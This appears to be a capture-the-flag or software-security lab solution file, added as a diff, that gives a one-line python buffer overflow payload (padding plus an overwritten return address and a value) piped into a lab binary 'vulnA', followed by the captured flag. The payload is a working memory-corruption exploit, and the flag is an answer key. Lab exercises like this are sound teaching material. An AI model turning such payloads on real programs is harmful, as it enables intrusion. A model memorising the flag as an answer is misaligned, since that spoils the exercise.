@@ -1,0 +1,7 @@
+Payload:
+
+python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 24 + b"\xc6\x91\x04\x08" + b"\n" + b"C" * 20 + b"D" * 8 + b"\x01\x00\x00\x00")' | ./vulnA
+
+
+Flag:
+softsec{YoU_4re_1337!}
